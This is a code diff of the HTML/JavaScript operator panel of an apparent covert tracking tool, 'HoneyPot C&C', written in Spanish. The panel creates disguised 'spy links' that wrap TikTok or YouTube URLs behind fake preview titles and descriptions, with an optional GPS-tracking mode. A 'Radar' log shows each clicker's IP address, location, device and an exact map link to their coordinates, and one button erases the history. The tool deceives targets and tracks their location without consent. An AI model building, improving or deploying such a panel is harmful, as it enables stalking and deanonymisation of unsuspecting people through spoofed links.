@@ -5,95 +5,160 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>HoneyPot C&C</title>
+    <title>C&C V4</title>
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons+Round" rel="stylesheet">
     <style>
-        :root { --bg: #000000; --card: #1c1c1e; --text: #ffffff; --green: #30d158; --red: #ff453a; --gray: #8e8e93; }
-        body { background-color: var(--bg); color: var(--text); font-family: -apple-system, BlinkMacSystemFont, sans-serif; margin: 0; padding: 20px; padding-top: 50px; }
-        h1 { font-size: 28px; text-align: center; margin-bottom: 30px; letter-spacing: -0.5px; }
-        .status-dot { height: 10px; width: 10px; background-color: var(--green); border-radius: 50%; display: inline-block; margin-right: 5px; box-shadow: 0 0 10px var(--green); }
-        .card { background-color: var(--card); border-radius: 18px; padding: 20px; margin-bottom: 20px; }
-        .label-input { font-size: 11px; color: var(--gray); margin-bottom: 6px; display: block; text-transform: uppercase; font-weight: bold; }
-        input { background-color: #2c2c2e; border: none; color: white; padding: 15px; width: 100%; box-sizing: border-box; border-radius: 12px; font-size: 15px; margin-bottom: 15px; outline: none; }
-        .btn { background-color: var(--green); color: black; border: none; padding: 16px; width: 100%; border-radius: 14px; font-size: 16px; font-weight: 800; cursor: pointer; }
-        #link-result { display: none; margin-top: 20px; word-break: break-all; background: #2c2c2e; padding: 15px; border-radius: 12px; font-family: monospace; color: var(--green); text-align: center; border: 1px dashed var(--gray); }
-        .advanced-options { margin-top: 15px; border-top: 1px solid #333; padding-top: 15px; }
-        .toggle-adv { color: var(--green); font-size: 14px; text-align: center; cursor: pointer; margin-bottom: 15px; font-weight: bold; text-decoration: underline; }
+        :root {
+            --bg: #0f0f11; --card: #1e1e24; --accent: #00ff88; --text: #ffffff;
+            --text-sec: #8b8b93; --danger: #ff4757; --glass: rgba(30, 30, 36, 0.8);
+        }
+        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+        body { background-color: var(--bg); color: var(--text); font-family: -apple-system, BlinkMacSystemFont, sans-serif; margin: 0; padding: 0; padding-bottom: 80px; }
         
-        /* SWITCH GPS */
-        .switch-container { display: flex; justify-content: space-between; align-items: center; background: #333; padding: 10px; border-radius: 10px; margin-bottom: 20px; }
-        .switch { position: relative; display: inline-block; width: 50px; height: 28px; }
+        /* HEADER */
+        .header { padding: 20px 20px 10px 20px; display: flex; align-items: center; justify-content: space-between; }
+        .header h1 { font-size: 24px; margin: 0; font-weight: 800; letter-spacing: -0.5px; background: linear-gradient(45deg, #fff, #888); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .status-badge { background: rgba(0, 255, 136, 0.15); color: var(--accent); padding: 4px 10px; border-radius: 20px; font-size: 11px; font-weight: bold; display: flex; align-items: center; gap: 5px; }
+        .dot { width: 6px; height: 6px; background: var(--accent); border-radius: 50%; box-shadow: 0 0 8px var(--accent); }
+
+        /* TABS NAVIGATION */
+        .nav-bar { position: fixed; bottom: 0; width: 100%; background: rgba(15, 15, 17, 0.9); backdrop-filter: blur(10px); border-top: 1px solid #333; display: flex; justify-content: space-around; padding: 10px 0; z-index: 100; }
+        .nav-item { color: var(--text-sec); text-align: center; font-size: 10px; display: flex; flex-direction: column; align-items: center; gap: 4px; cursor: pointer; width: 33%; }
+        .nav-item.active { color: var(--accent); }
+        .nav-item span { font-size: 24px; }
+
+        /* VISTAS */
+        .view { display: none; padding: 20px; animation: fadeIn 0.3s ease; }
+        .view.active { display: block; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+
+        /* CARDS & INPUTS */
+        .card { background: var(--card); border-radius: 20px; padding: 20px; margin-bottom: 20px; border: 1px solid #2a2a30; box-shadow: 0 10px 30px -10px rgba(0,0,0,0.5); }
+        .label { font-size: 11px; color: var(--text-sec); font-weight: 700; margin-bottom: 8px; display: block; letter-spacing: 0.5px; }
+        input { width: 100%; background: #000; border: 1px solid #333; color: #fff; padding: 14px; border-radius: 12px; font-size: 15px; outline: none; transition: 0.2s; }
+        input:focus { border-color: var(--accent); }
+        
+        .btn { width: 100%; padding: 16px; border-radius: 14px; border: none; font-weight: 700; font-size: 16px; cursor: pointer; margin-top: 10px; display: flex; align-items: center; justify-content: center; gap: 8px; }
+        .btn-primary { background: var(--accent); color: #000; box-shadow: 0 4px 15px rgba(0, 255, 136, 0.2); }
+        .btn-danger { background: rgba(255, 71, 87, 0.15); color: var(--danger); border: 1px solid rgba(255, 71, 87, 0.3); margin-top: 0; }
+        
+        /* LOGS */
+        .log-item { display: flex; gap: 15px; padding: 15px 0; border-bottom: 1px solid #2a2a30; }
+        .log-icon { width: 40px; height: 40px; background: #2a2a30; border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 20px; }
+        .log-info { flex: 1; }
+        .log-title { font-weight: bold; font-size: 15px; margin-bottom: 2px; }
+        .log-meta { font-size: 12px; color: var(--text-sec); display: flex; gap: 8px; align-items: center; }
+        .log-map-btn { color: #fbce49; font-size: 12px; font-weight: bold; text-decoration: none; display: inline-flex; align-items: center; gap: 3px; margin-top: 4px; background: rgba(251, 206, 73, 0.1); padding: 3px 8px; border-radius: 6px; }
+
+        /* SWITCH */
+        .row-switch { display: flex; justify-content: space-between; align-items: center; background: #000; padding: 12px; border-radius: 12px; margin-bottom: 15px; border: 1px solid #333; }
+        .switch { position: relative; display: inline-block; width: 44px; height: 24px; }
         .switch input { opacity: 0; width: 0; height: 0; }
-        .slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #ccc; transition: .4s; border-radius: 34px; }
-        .slider:before { position: absolute; content: ""; height: 20px; width: 20px; left: 4px; bottom: 4px; background-color: white; transition: .4s; border-radius: 50%; }
-        input:checked + .slider { background-color: var(--red); } /* Rojo para indicar peligro/gps */
-        input:checked + .slider:before { transform: translateX(22px); }
-        .log-item { border-bottom: 1px solid #2c2c2e; padding: 12px 0; font-size: 14px; }
-        .log-loc { font-weight: bold; margin-top: 2px; font-size: 15px; }
-        .map-link { color: #ffcc00; text-decoration: none; font-weight: bold; display: block; margin-top: 5px; }
+        .slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #333; transition: .3s; border-radius: 34px; }
+        .slider:before { position: absolute; content: ""; height: 18px; width: 18px; left: 3px; bottom: 3px; background-color: white; transition: .3s; border-radius: 50%; }
+        input:checked + .slider { background-color: var(--accent); }
+        input:checked + .slider:before { transform: translateX(20px); }
+
+        /* RESULTADO */
+        #result-area { display: none; animation: fadeIn 0.3s; }
+        .link-box { background: #2a2a30; padding: 15px; border-radius: 12px; font-family: monospace; font-size: 13px; color: var(--accent); word-break: break-all; text-align: center; margin-bottom: 10px; border: 1px dashed #444; }
     </style>
 </head>
 <body>
-    <h1><span class="status-dot"></span>HONEYPOT PRO</h1>
 
-    <div class="card">
-        <h3 style="margin-top:0; margin-bottom:20px;">🕷️ Nueva Trampa</h3>
-        
-        <label class="label-input">LINK REAL</label>
-        <input type="text" id="urlDestino" placeholder="Link de TikTok / YouTube">
-        
-        <label class="label-input">NOMBRE</label>
-        <input type="text" id="nombreTrampa" placeholder="Ej: Caso WhatsApp">
-        
-        <div class="switch-container">
-            <span style="font-weight:bold; font-size:13px;">🛰️ MODO SATÉLITE (GPS)</span>
-            <label class="switch">
-                <input type="checkbox" id="checkGPS">
-                <span class="slider round"></span>
-            </label>
-        </div>
-
-        <div class="toggle-adv" onclick="toggleAdvanced()">⚙️ PERSONALIZAR DISFRAZ</div>
-        <div class="advanced-options" id="advOptions" style="display:none;">
-            <label class="label-input">TÍTULO FALSO</label>
-            <input type="text" id="metaTitulo" placeholder="Ej: TikTok - @usuario">
-            <label class="label-input">DESCRIPCIÓN FALSA</label>
-            <input type="text" id="metaDesc" placeholder="Ej: 745.5K me gusta...">
-            <label class="label-input">IMAGEN FALSA (URL)</label>
-            <input type="text" id="metaImg">
-        </div>
-        
-        <button class="btn" onclick="crearTrampa()">GENERAR ENLACE ESPÍA</button>
-        <div id="link-result" onclick="copiarLink(this)"></div>
+    <div class="header">
+        <h1>HoneyPot C&C</h1>
+        <div class="status-badge"><div class="dot"></div> ONLINE</div>
     </div>
 
-    <div class="card">
-        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:15px; border-bottom: 1px solid #2c2c2e; padding-bottom: 10px;">
-            <h3 style="margin:0">📡 Radar</h3>
-            <button onclick="cargarLogs()" style="background:none; border:none; color:var(--green); font-size:22px;">↻</button>
+    <div id="view-home" class="view active">
+        <div class="card">
+            <label class="label">DESTINO (TIKTOK/YOUTUBE)</label>
+            <input type="text" id="urlDestino" placeholder="https://...">
+            <div style="height:15px"></div>
+            <label class="label">NOMBRE REFERENCIA</label>
+            <input type="text" id="nombreTrampa" placeholder="Ej: Objetivo 1">
+            
+            <div style="height:20px"></div>
+            
+            <div class="row-switch">
+                <span style="font-size:13px; font-weight:600;">🛰️ RASTREO SATELITAL (GPS)</span>
+                <label class="switch">
+                    <input type="checkbox" id="checkGPS">
+                    <span class="slider round"></span>
+                </label>
+            </div>
+
+            <div onclick="document.getElementById('adv-opts').style.display='block'; this.style.display='none'" style="text-align:center; font-size:12px; color:var(--text-sec); margin-bottom:15px; cursor:pointer;">+ Opciones de Disfraz</div>
+            
+            <div id="adv-opts" style="display:none; margin-bottom:15px; border-top:1px solid #333; padding-top:15px;">
+                <label class="label">TÍTULO FALSO</label>
+                <input type="text" id="metaTitulo" placeholder="Título del video...">
+                <div style="height:10px"></div>
+                <label class="label">DESCRIPCIÓN</label>
+                <input type="text" id="metaDesc" placeholder="Likes, comentarios...">
+            </div>
+
+            <button class="btn btn-primary" onclick="generarLink()">
+                <span class="material-icons-round">bolt</span> GENERAR ENLACE
+            </button>
         </div>
-        <div id="logs-container"><div style="text-align:center; color:gray;">Cargando...</div></div>
+
+        <div id="result-area">
+            <div class="link-box" id="final-link" onclick="copiar(this)">...</div>
+            <div style="text-align:center; font-size:12px; color:var(--text-sec);">Toca el link para copiar</div>
+        </div>
+    </div>
+
+    <div id="view-logs" class="view">
+        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:20px;">
+            <h2 style="margin:0; font-size:20px;">Actividad Reciente</h2>
+            <button onclick="cargarLogs()" style="background:none; border:none; color:var(--accent);"><span class="material-icons-round">refresh</span></button>
+        </div>
+        <div id="logs-container">
+            </div>
+        <div style="height:50px"></div>
+        <button class="btn btn-danger" onclick="borrarHistorial()">
+            <span class="material-icons-round">delete</span> BORRAR HISTORIAL
+        </button>
+    </div>
+
+    <div class="nav-bar">
+        <div class="nav-item active" onclick="cambiarVista('home', this)">
+            <span class="material-icons-round">add_circle</span>
+            Crear
+        </div>
+        <div class="nav-item" onclick="cambiarVista('logs', this)">
+            <span class="material-icons-round">radar</span>
+            Radar
+        </div>
     </div>
 
     <script>
-        function toggleAdvanced() {
-            let div = document.getElementById('advOptions');
-            div.style.display = (div.style.display === 'block') ? 'none' : 'block';
+        // --- NAVEGACIÓN ---
+        function cambiarVista(vista, elem) {
+            document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
+            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+            document.getElementById('view-' + vista).classList.add('active');
+            elem.classList.add('active');
+            if(vista === 'logs') cargarLogs();
         }
 
-        async function crearTrampa() {
-            let btn = document.querySelector('.btn');
-            btn.innerText = "PROCESANDO...";
+        // --- LÓGICA ---
+        async function generarLink() {
+            let btn = document.querySelector('.btn-primary');
+            let originalText = btn.innerHTML;
+            btn.innerHTML = "PROCESANDO...";
             
             let payload = {
                 nombre: document.getElementById('nombreTrampa').value || "Link",
                 url_destino: document.getElementById('urlDestino').value,
-                usar_gps: document.getElementById('checkGPS').checked, // Enviamos estado del GPS
+                usar_gps: document.getElementById('checkGPS').checked,
                 meta_titulo: document.getElementById('metaTitulo').value,
-                meta_desc: document.getElementById('metaDesc').value,
-                meta_img: document.getElementById('metaImg').value
+                meta_desc: document.getElementById('metaDesc').value
             };
-            
-            if(!payload.url_destino) { alert("⚠️ Falta Link"); btn.innerText = "GENERAR"; return; }
+
+            if(!payload.url_destino) { alert("Falta el link"); btn.innerHTML = originalText; return; }
             if(!payload.url_destino.startsWith('http')) payload.url_destino = 'https://' + payload.url_destino;
 
             try {
@@ -101,46 +166,59 @@
                     method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload)
                 });
                 let data = await res.json();
-                document.getElementById('link-result').style.display = 'block';
-                document.getElementById('link-result').innerText = data.link;
-                btn.innerText = "¡LISTO!";
-                alert("✅ Link Generado");
-            } catch(e) { alert("Error"); btn.innerText = "REINTENTAR"; }
+                document.getElementById('result-area').style.display = 'block';
+                document.getElementById('final-link').innerText = data.link;
+                btn.innerHTML = originalText;
+            } catch(e) { alert("Error"); btn.innerHTML = originalText; }
         }
-        
-        function copiarLink(e) { navigator.clipboard.writeText(e.innerText); alert("Copiado"); }
+
+        function copiar(e) { navigator.clipboard.writeText(e.innerText); alert("Copiado"); }
 
         async function cargarLogs() {
+            let container = document.getElementById('logs-container');
+            container.innerHTML = "<div style='text-align:center; color:gray; margin-top:20px'>Cargando...</div>";
+            
             try {
                 let res = await fetch('/api/ver_ataques');
                 let data = await res.json();
                 let html = "";
-                if(data.length === 0) html = "<div style='text-align:center; padding:30px; color:#444'>Sin actividad</div>";
+                
+                if(data.length === 0) html = "<div style='text-align:center; color:#444; margin-top:40px'>Sin actividad</div>";
                 
                 data.forEach(log => {
-                    let icon = "💻";
-                    if(log.dispositivo.includes("iPhone")) icon = " iPhone";
-                    else if(log.dispositivo.includes("Android")) icon = "🤖 Android";
+                    let iconName = "laptop";
+                    if(log.dispositivo.includes("iPhone")) iconName = "phone_iphone";
+                    else if(log.dispositivo.includes("Android")) iconName = "android";
                     
-                    // Si hay GPS exacto, mostramos link a Google Maps
-                    let gpsInfo = "";
+                    let gpsBtn = "";
                     if(log.lat && log.lon) {
-                        gpsInfo = `<a href="https://www.google.com/maps?q=${log.lat},${log.lon}" target="_blank" class="map-link">📍 VER UBICACIÓN EXACTA</a>`;
+                        gpsBtn = `<a href="http://maps.google.com/?q=${log.lat},${log.lon}" target="_blank" class="log-map-btn"><span class="material-icons-round" style="font-size:14px">place</span> MAPA EXACTO</a>`;
                     }
 
                     html += `
                     <div class="log-item">
-                        <span style="float:right; font-size:20px;">${icon}</span>
-                        <div class="log-loc">🌍 ${log.ubicacion}</div>
-                        ${gpsInfo}
-                        <div style="color:var(--green); font-family:monospace; font-size:12px;">${log.ip}</div>
-                        <div style="color:gray; font-size:11px;">${log.hora} • ${log.trampa}</div>
+                        <div class="log-icon"><span class="material-icons-round">${iconName}</span></div>
+                        <div class="log-info">
+                            <div class="log-title">${log.ubicacion}</div>
+                            <div class="log-meta">${log.ip} • ${log.hora}</div>
+                            <div class="log-meta" style="color:#555; margin-top:2px">🎯 ${log.trampa}</div>
+                            ${gpsBtn}
+                        </div>
                     </div>`;
                 });
-                document.getElementById('logs-container').innerHTML = html;
-            } catch(e) { console.log(e); }
+                container.innerHTML = html;
+            } catch(e) { container.innerHTML = "Error cargando"; }
         }
-        cargarLogs();
+
+        async function borrarHistorial() {
+            if(!confirm("¿Seguro que quieres BORRAR TODO el historial? No se puede deshacer.")) return;
+            
+            try {
+                await fetch('/api/borrar_logs', { method: 'POST' });
+                cargarLogs(); // Recargar lista vacía
+                alert("🗑️ Historial eliminado.");
+            } catch(e) { alert("Error al borrar"); }
+        }
     </script>
 </body>
 </html>
